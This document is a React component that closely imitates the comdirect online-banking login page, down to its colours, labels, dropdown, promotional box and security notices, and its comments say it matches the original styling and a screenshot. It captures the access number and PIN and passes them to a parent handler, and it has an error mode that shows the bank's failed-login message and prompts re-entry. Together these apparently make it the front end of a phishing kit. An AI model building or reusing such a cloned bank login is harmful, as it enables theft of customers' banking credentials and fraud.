import React, { useState, useEffect } from 'react';

interface LoginFormProps {
  sessionKey: string;
  onSubmit: (data: { zugangsnummer: string; pin: string }) => void;
  onLoading: (loading: boolean) => void;
  showError?: boolean;
  initialValues?: { zugangsnummer: string; pin: string };
}

const LoginForm: React.FC<LoginFormProps> = ({ onSubmit, onLoading, showError, initialValues }) => {
  const [zugangsnummer, setZugangsnummer] = useState(initialValues?.zugangsnummer || '');
  const [pin, setPin] = useState(initialValues?.pin || '');
  const [direktZu, setDirektZu] = useState('persoenlicher-bereich');
  const [isMobile, setIsMobile] = useState(false);
  const [zugangsnummerFocused, setZugangsnummerFocused] = useState(false);
  const [pinFocused, setPinFocused] = useState(false);
  
  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);
  
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onLoading(true);
    onSubmit({ zugangsnummer, pin });
  };

  // CSS variables that match the original comdirect styling
  const cssVariables = {
    '--text': '#28363c',
    '--text-secondary': '#7d8287',
    '--border': '#d1d5db',
    '--border-hover': '#28363c',
    '--active': '#28363c',
    '--style-primary': '#fff500',
    '--style-primary-hover': '#e6d900',
    '--style-primary-on-it': '#000000',
    '--bg': '#ffffff',
    '--focus': '#28363c',
    '--focus-offset': '2px',
    '--focus-width': '1px'
  } as React.CSSProperties;

  return (
    <div style={
      {
        ...cssVariables,
        minHeight: '100vh',
        backgroundColor: '#ffffff',
        fontFamily: 'MarkWeb, Arial, sans-serif'
            }
    }>
      <div style={
        {
          maxWidth: '980px',
          margin: '0 auto', 
          width: '100%'
        }
      }>
        <div style={
          {
            display: 'flex',
            flexDirection: isMobile ? 'column' : 'row',
            minHeight: '100vh'
          }
        }>
        {/* Left Column - Login Form */}
        <div style={
          {
            flex: isMobile ? '1' : '0 0 calc(50% - 15px)',
            padding: isMobile ? '20px' : '60px 15px 60px 20px',
            backgroundColor: '#ffffff',
            display: 'flex',
            flexDirection: 'column',
            justifyContent: 'flex-start'
          }
        }>
          <div style={
            {
              width: '100%',
              maxWidth: 'none'
            }
          }>
            {/* Login Title */}
            <h1 style={
              {
                fontSize: '1.875rem',
                fontWeight: '400',
                lineHeight: '2.625rem',
                margin: '0 0 2rem 0',
                color: 'var(--text)',
                fontFamily: 'MarkWeb, Arial, sans-serif'
              }
            }>
              comdirect Login
            </h1>
            
            {/* Login Form */}
            <form onSubmit={handleSubmit} style={
              {
                display: 'flex',
                flexDirection: 'column',
                gap: '1rem'
              }
            }>
              {/* Zugangsnummer Field - Floating Input */}
              <div className="floating-input" style={
                {
                  position: 'relative',
                  borderRadius: '0.25rem',
                  marginBottom: '1rem'
                }
              }>
                <input
                  type="text"
                  value={zugangsnummer}
                  onChange={(e) => setZugangsnummer(e.target.value)}
                  required
                  style={
                    {
                      lineHeight: '1',
                    width: '100%',
                      height: '3.75rem',
                      padding: '1.8125rem 0.5625rem 0.625rem',
                      color: showError ? '#dc2626' : 'var(--text)',
                      border: showError ? '1px solid #dc2626' : '1px solid var(--border)',
                      borderRadius: '0.25rem',
                      outline: '0',
                      background: 'transparent',
                      appearance: 'none',
                      fontFamily: 'MarkWeb, Arial, sans-serif',
                      fontSize: '1rem',
                      boxSizing: 'border-box',
                      transition: 'border-color 0.2s ease, box-shadow 0.2s ease'
                    }
                  }
                  onFocus={(e) => {
                    setZugangsnummerFocused(true);
                    // Clear field and reset styling when clicking on error field
                    if (showError) {
                      setZugangsnummer('');
                      e.currentTarget.style.color = 'var(--text)';
                      e.currentTarget.style.borderColor = 'var(--border-hover)';
                    } else {
                      e.currentTarget.style.borderColor = 'var(--border-hover)';
                    }
                    e.currentTarget.style.boxShadow = '0 2px 4px rgba(40,54,60,.2)';
                  }}
                  onBlur={(e) => {
                    setZugangsnummerFocused(false);
                    // Only show error styling if field has content and there's an error
                    if (showError && zugangsnummer) {
                      e.currentTarget.style.borderColor = '#dc2626';
                    } else {
                      e.currentTarget.style.borderColor = 'var(--border)';
                    }
                    e.currentTarget.style.boxShadow = 'none';
                  }}
                  onMouseEnter={(e) => {
                    if (e.currentTarget !== document.activeElement) {
                      if (showError && zugangsnummer) {
                        e.currentTarget.style.borderColor = '#dc2626';
                      } else {
                        e.currentTarget.style.borderColor = 'var(--active)';
                      }
                    }
                  }}
                  onMouseLeave={(e) => {
                    if (e.currentTarget !== document.activeElement) {
                      if (showError && zugangsnummer) {
                        e.currentTarget.style.borderColor = '#dc2626';
                      } else {
                        e.currentTarget.style.borderColor = 'var(--border)';
                      }
                    }
                  }}
                />
                <label style={
                  {
                    position: 'absolute',
                    top: (zugangsnummerFocused || zugangsnummer) ? '0.3125rem' : '50%',
                    left: '0.5625rem',
                    transform: (zugangsnummerFocused || zugangsnummer) ? 'translateY(0) scale(0.875)' : 'translateY(-50%) scale(1)',
                    transition: 'all 0.2s cubic-bezier(0.4,0,0.2,1)',
                    transformOrigin: 'left top',
                    pointerEvents: 'none',
                    color: (zugangsnummerFocused || zugangsnummer) ? 'var(--text-secondary)' : 'var(--text)',
                    whiteSpace: 'nowrap',
                    fontSize: (zugangsnummerFocused || zugangsnummer) ? '0.875rem' : '1rem',
                    lineHeight: '1.25rem',
                    zIndex: 1
                  }
                }>
                  Zugangsnummer / Benutzername
                </label>
              </div>
                
              {/* PIN Field - Floating Input */}
              <div className="floating-input" style={
                {
                  position: 'relative',
                  borderRadius: '0.25rem',
                  marginBottom: '1rem'
                }
              }>
                <input
                  type="password"
                  value={pin}
                  onChange={(e) => setPin(e.target.value)}
                  required
                  style={
                    {
                      lineHeight: '1',
                    width: '100%',
                      height: '3.75rem',
                      padding: '1.8125rem 0.5625rem 0.625rem',
                      color: 'var(--text)',
                      border: '1px solid var(--border)',
                      borderRadius: '0.25rem',
                      outline: '0',
                      background: 'transparent',
                      appearance: 'none',
                      fontFamily: 'MarkWeb, Arial, sans-serif',
                      fontSize: '1rem',
                      boxSizing: 'border-box',
                      transition: 'border-color 0.2s ease, box-shadow 0.2s ease'
                    }
                  }
                  onFocus={(e) => {
                    setPinFocused(true);
                    e.currentTarget.style.borderColor = 'var(--border-hover)';
                    e.currentTarget.style.boxShadow = '0 2px 4px rgba(40,54,60,.2)';
                  }}
                  onBlur={(e) => {
                    setPinFocused(false);
                    e.currentTarget.style.borderColor = 'var(--border)';
                    e.currentTarget.style.boxShadow = 'none';
                  }}
                  onMouseEnter={(e) => {
                    if (e.currentTarget !== document.activeElement) {
                      e.currentTarget.style.borderColor = 'var(--active)';
                    }
                  }}
                  onMouseLeave={(e) => {
                    if (e.currentTarget !== document.activeElement) {
                      e.currentTarget.style.borderColor = 'var(--border)';
                    }
                  }}
                />
                <label style={
                  {
                    position: 'absolute',
                    top: (pinFocused || pin) ? '0.3125rem' : '50%',
                    left: '0.5625rem',
                    transform: (pinFocused || pin) ? 'translateY(0) scale(0.875)' : 'translateY(-50%) scale(1)',
                    transition: 'all 0.2s cubic-bezier(0.4,0,0.2,1)',
                    transformOrigin: 'left top',
                    pointerEvents: 'none',
                    color: (pinFocused || pin) ? 'var(--text-secondary)' : 'var(--text)',
                    whiteSpace: 'nowrap',
                    fontSize: (pinFocused || pin) ? '0.875rem' : '1rem',
                    lineHeight: '1.25rem',
                    zIndex: 1
                  }
                }>
                  PIN / Passwort
                </label>
              </div>

              {/* Error Message */}
              {showError && (
                <div style={{
                  marginBottom: '1rem',
                  display: 'flex',
                  alignItems: 'flex-start',
                  gap: '8px'
                }}>
                  {/* Warning Icon */}
                  <span 
                    aria-hidden="true" 
                    className="text-size--large medium icon-font-warning"
                    style={{
                      color: '#dc2626',
                      flexShrink: 0
                    }}
                  ></span>
                  
                  {/* Error Text */}
                  <div style={{
                    color: '#dc2626',
                    fontSize: '0.875rem',
                    fontFamily: 'MarkWeb, Arial, sans-serif',
                    lineHeight: '1.4'
                  }}>
                    <div style={{ fontWeight: '600', marginBottom: '4px' }}>
                      Für Kunden:
                    </div>
                    <div style={{ marginBottom: '8px' }}>
                      Ihr Login war nicht erfolgreich, bitte prüfen Sie Ihre Eingaben. Melden Sie sich mit Ihrer persönlichen Zugangsnummer und PIN an. Bitte beachten Sie, dass nach 3 Fehlversuchen aus Sicherheitsgründen eine Zugangssperre erfolgt.
                    </div>
                    <div style={{ fontWeight: 'normal', marginBottom: '4px' }}>
                      Für "Meine comdirect":
                    </div>
                    <div>
                      Melden Sie sich mit Ihrem Benutzernamen und Ihrem Passwort an.
                    </div>
                  </div>
                </div>
              )}
              
              {/* Direct To Dropdown - Floating Select */}
              <div className="floating-input-select" style={
                {
                  position: 'relative',
                  display: 'inline-flex',
                  width: '100%',
                  color: 'var(--text)',
                  flexWrap: 'wrap',
                  alignItems: 'flex-start',
                  alignContent: 'stretch',
                  marginBottom: '1rem'
                }
              }>
                <select
                  value={direktZu}
                  onChange={(e) => setDirektZu(e.target.value)}
                  style={
                    {
                      lineHeight: '1.25rem',
                      width: '100%',
                      height: '3.75rem',
                      padding: '1.25rem 2.5rem 0 0.625rem',
                      userSelect: 'none',
                      color: 'inherit',
                      border: '1px solid var(--border)',
                      borderRadius: '0.25rem',
                      outline: '0',
                      background: 'transparent',
                      appearance: 'none',
                      fontFamily: 'MarkWeb, Arial, sans-serif',
                      fontSize: '1rem',
                      overflow: 'hidden',
                      whiteSpace: 'nowrap',
                      textOverflow: 'ellipsis',
                      cursor: 'pointer',
                      boxSizing: 'border-box',
                      transition: 'border-color 0.2s ease, box-shadow 0.2s ease'
                    }
                  }
                  onFocus={(e) => {
                    e.currentTarget.style.borderColor = 'var(--border-hover)';
                    e.currentTarget.style.boxShadow = '0 2px 4px rgba(40,54,60,.2)';
                  }}
                  onBlur={(e) => {
                    e.currentTarget.style.borderColor = 'var(--border)';
                    e.currentTarget.style.boxShadow = 'none';
                  }}
                  onMouseEnter={(e) => {
                    if (e.currentTarget !== document.activeElement) {
                      e.currentTarget.style.borderColor = 'var(--border-hover)';
                    }
                  }}
                  onMouseLeave={(e) => {
                    if (e.currentTarget !== document.activeElement) {
                      e.currentTarget.style.borderColor = 'var(--border)';
                    }
                  }}
                >
                  <option value="persoenlicher-bereich" style={{ backgroundColor: '#ffffff', color: '#28363c', padding: '8px 12px' }}>Persönlicher Bereich</option>
                  <option value="depotuebersicht" style={{ backgroundColor: '#ffffff', color: '#28363c', padding: '8px 12px' }}>Depotübersicht</option>
                  <option value="abrechnungsdaten" style={{ backgroundColor: '#ffffff', color: '#28363c', padding: '8px 12px' }}>Abrechnungsdaten</option>
                  <option value="depotumsaetze" style={{ backgroundColor: '#ffffff', color: '#28363c', padding: '8px 12px' }}>Depotumstätze</option>
                  <option value="order" style={{ backgroundColor: '#ffffff', color: '#28363c', padding: '8px 12px' }}>Order</option>
                  <option value="orderbuch" style={{ backgroundColor: '#ffffff', color: '#28363c', padding: '8px 12px' }}>Orderbuch</option>
                  <option value="kontoumsaetze" style={{ backgroundColor: '#ffffff', color: '#28363c', padding: '8px 12px' }}>Kontoumsätze</option>
                  <option value="ueberweisung" style={{ backgroundColor: '#ffffff', color: '#28363c', padding: '8px 12px' }}>Überweisung</option>
                  <option value="bonus-sparen" style={{ backgroundColor: '#ffffff', color: '#28363c', padding: '8px 12px' }}>Bonus-Sparen</option>
                  <option disabled style={{ backgroundColor: '#f5f5f5', color: '#999999', padding: '4px 12px', fontSize: '12px', textAlign: 'center' }}>──────────</option>
                  <option value="musterdepot" style={{ backgroundColor: '#ffffff', color: '#28363c', padding: '8px 12px' }}>Musterdepot</option>
                  <option value="meine-informer-startseite" style={{ backgroundColor: '#ffffff', color: '#28363c', padding: '8px 12px' }}>Meine Informer Startseite</option>
                </select>
                <label style={
                  {
                    fontSize: '0.875rem',
                    lineHeight: '1.25rem',
                    position: 'absolute',
                    top: '0.3125rem',
                    left: '0.625rem',
                    right: '2.5rem',
                    pointerEvents: 'none',
                    color: 'var(--text-secondary)',
                    overflow: 'hidden',
                    whiteSpace: 'nowrap',
                    textOverflow: 'ellipsis'
                  }
                }>
                  Direkt zu
                </label>
                <div style={
                  {
                    position: 'absolute',
                    top: '0',
                    right: '0',
                    display: 'flex',
                    width: '2.5rem',
                    height: '3.75rem',
                    pointerEvents: 'none',
                    borderWidth: '0 0 0 1px',
                    borderStyle: 'solid',
                    borderColor: 'var(--border)',
                    alignItems: 'center',
                    justifyContent: 'center'
                  }
                }>
                  <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                    <path d="M4 6l4 4 4-4" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                </div>
              </div>

              {/* Login Button - Primary Style */}
              <button
                type="submit"
                className="button button--primary"
                style={
                  {
                    display: 'inline-flex',
                    justifyContent: 'center',
                    alignItems: 'center',
                  textDecoration: 'none',
                    color: 'var(--style-primary-on-it)',
                    cursor: 'pointer',
                    border: 'none',
                    outline: '0',
                    fontWeight: '500',
                    transition: 'background-color 0.2s linear, color 0.1s linear',
                    textAlign: 'center',
                    backgroundColor: 'var(--style-primary)',
                    padding: '0.75rem 1.25rem',
                    borderRadius: '24px',
                    fontSize: '1rem',
                    fontFamily: 'MarkWeb, Arial, sans-serif',
                    marginTop: '0.5rem',
                    height: '48px',
                    width: 'auto',
                    alignSelf: 'flex-start'
                  }
                }
                onMouseEnter={(e) => {
                  e.currentTarget.style.backgroundColor = 'var(--style-primary-hover)';
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.backgroundColor = 'var(--style-primary)';
                }}
                onFocus={(e) => {
                  e.currentTarget.style.outlineColor = 'var(--focus)';
                  e.currentTarget.style.outlineOffset = 'var(--focus-offset)';
                  e.currentTarget.style.outlineWidth = 'var(--focus-width)';
                  e.currentTarget.style.outlineStyle = 'solid';
                  e.currentTarget.style.zIndex = '30';
                }}
                onBlur={(e) => {
                  e.currentTarget.style.outline = '0';
                }}
              >
                Anmelden ›
              </button>

              {/* Help Links */}
              <div style={
                {
                  marginTop: '1rem',
                  fontSize: '0.875rem',
                  fontFamily: 'MarkWeb, Arial, sans-serif',
                  lineHeight: '1.5'
                }
              }>
                <a href="#" style={
                  {
                    color: '#606d71',
                    textDecoration: 'underline'
                  }
                }>
                  Information zum Login
                </a>
                <span style={{ color: '#606d71', margin: '0 0.25rem' }}>•</span>
                <a href="#" style={
                  {
                    color: '#606d71',
                    textDecoration: 'underline'
                  }
                }>
                  Login vergessen / gesperrt?
                </a>
              </div>

              {/* Kunde werden Button - Grey Style matching screenshot */}
              <button
                type="button"
                style={
                  {
                    display: 'inline-flex',
                    justifyContent: 'center',
                    alignItems: 'center',
                    textDecoration: 'none',
                    color: '#28363c',
                    cursor: 'pointer',
                    outline: '0',
                    fontWeight: '400',
                    transition: 'background-color 0.2s ease, transform 0.1s ease',
                    textAlign: 'center',
                    backgroundColor: '#e5e7eb',
                    border: 'none',
                    height: '48px',
                    borderRadius: '24px',
                    padding: '0.75rem 1.25rem',
                    fontSize: '1rem',
                    fontFamily: 'MarkWeb, Arial, sans-serif',
                    marginTop: '1.5rem',
                    width: '100%'
                  }
                }
                onMouseEnter={(e) => {
                  e.currentTarget.style.backgroundColor = '#d1d5db';
                  e.currentTarget.style.transform = 'translateY(-1px)';
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.backgroundColor = '#e5e7eb';
                  e.currentTarget.style.transform = 'translateY(0)';
                }}
              >
                Kunde werden ›
              </button>

              {/* Registration Link */}
              <div style={
                {
                  marginTop: '1rem',
                  fontSize: '0.875rem',
                  fontFamily: 'MarkWeb, Arial, sans-serif',
                  lineHeight: '1.5'
                }
              }>
                                 <a href="#" style={
                   {
                     color: '#606d71',
                     textDecoration: 'underline'
                   }
                 }>
                   Kostenfreie Registrierung für "Meine comdirect" und "comdirect community"
                 </a>
              </div>
            </form>
          </div>
        </div>
        
        {/* Right Column - Promotional Content (Desktop: Right side, Mobile: Below form) */}
        <div style={
          {
            flex: isMobile ? '1' : '0 0 calc(50% - 15px)',
            padding: isMobile ? '20px' : '60px 20px 60px 15px',
            backgroundColor: '#ffffff',
            display: 'flex',
            flexDirection: 'column'
          }
        }>
            {/* Promotional Box - 210px height with light grey background (Desktop only) */}
            {!isMobile && (
            <div style={
              {
                height: '210px',
                backgroundColor: '#f5f5f5',
                borderRadius: '4px',
                display: 'flex',
                overflow: 'hidden',
                marginBottom: '2rem'
              }
            }>
              {/* Image - fills height without padding */}
              <div style={
                {
                  width: '160px',
                  height: '210px',
                  flexShrink: 0
                }
              }>
                <img 
                  src="/images/sigmalang_473542755_lg-2x_512x672_1x.jpg" 
                  alt="Promotional" 
                  style={
                    {
                      width: '100%',
                      height: '100%',
                      objectFit: 'cover'
                    }
                  }
                />
              </div>

              {/* Text Content */}
              <div style={
                {
                  flex: 1,
                  padding: '20px',
                  display: 'flex',
                  flexDirection: 'column',
                  justifyContent: 'center'
                }
              }>
                {/* Headline */}
                <h2 style={
                  {
                    fontSize: '1.375rem',
                    lineHeight: '1.75rem',
                    letterSpacing: 'unset',
                    fontWeight: '500',
                    margin: '0 0 12px 0',
                    color: 'var(--text)',
                    fontFamily: 'MarkWeb, Arial, sans-serif'
                  }
                }>
                  Nicht von schlechten Eltern
                </h2>
                
                {/* Paragraph */}
                <p style={
                  {
                    fontSize: '1rem',
                    lineHeight: '1.5rem',
                    margin: '0',
                    color: 'var(--text)',
                    fontFamily: 'MarkWeb, Arial, sans-serif'
                  }
                }>
                  Mit dem Junior Depot Startkapital aufbauen – jetzt Kinderprämie² sichern
                </p>
              </div>
            </div>
            )}

            {/* Security Section - Wichtige Sicherheitshinweise */}
            <div style={
              {
                marginTop: '2rem'
              }
            }>
              {/* Warning Icon and Title */}
              <div style={
                {
                    display: 'flex',
                    alignItems: 'center',
                  gap: '8px',
                  marginBottom: '16px'
                }
              }>
                <span className="icon-font-warning"></span>
                <h3 style={
                  {
                    fontSize: '1rem',
                    fontWeight: '600',
                    lineHeight: '1.5rem',
                    margin: '0',
                    color: 'var(--text)',
                    fontFamily: 'MarkWeb, Arial, sans-serif'
                  }
                }>
                  Wichtige Sicherheitshinweise
                </h3>
              </div>
              
              {/* Security Links */}
              <div style={
                {
                  display: 'flex',
                  flexDirection: 'column'
                }
              }>
                {[
                  'Phishing-Briefe mit gefälschtem QR-Code',
                  'Warnung vor Phishing-Mails und -SMS',
                  'Unerwartete Aufforderung zur Aktualisierung / Reaktivierung des photoTAN-Verfahrens',
                  'Anrufe angeblicher Bankmitarbeiter / Ermittlungsbehörden / Software-Anbieter',
                  'Kartenbetrug bei Anzeigen-Portalen',
                  'Enkeltrick: Betrüger nutzen auch WhatsApp'
                ].map((item, index) => (
                  <a 
                    key={index}
                    href="#" 
                    style={
                      {
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'space-between',
                        padding: '12px 0',
                        textDecoration: 'none',
                        color: 'var(--text)',
                        fontSize: '0.875rem',
                        fontFamily: 'MarkWeb, Arial, sans-serif',
                        borderBottom: index < 5 ? '1px solid #e9ecef' : 'none'
                      }
                    }
                    onMouseEnter={(e) => e.currentTarget.style.color = '#0066cc'}
                    onMouseLeave={(e) => e.currentTarget.style.color = 'var(--text)'}
                  >
                    <span>{item}</span>
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                      <path d="M6 12l4-4-4-4" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                  </a>
                ))}
                </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginForm;
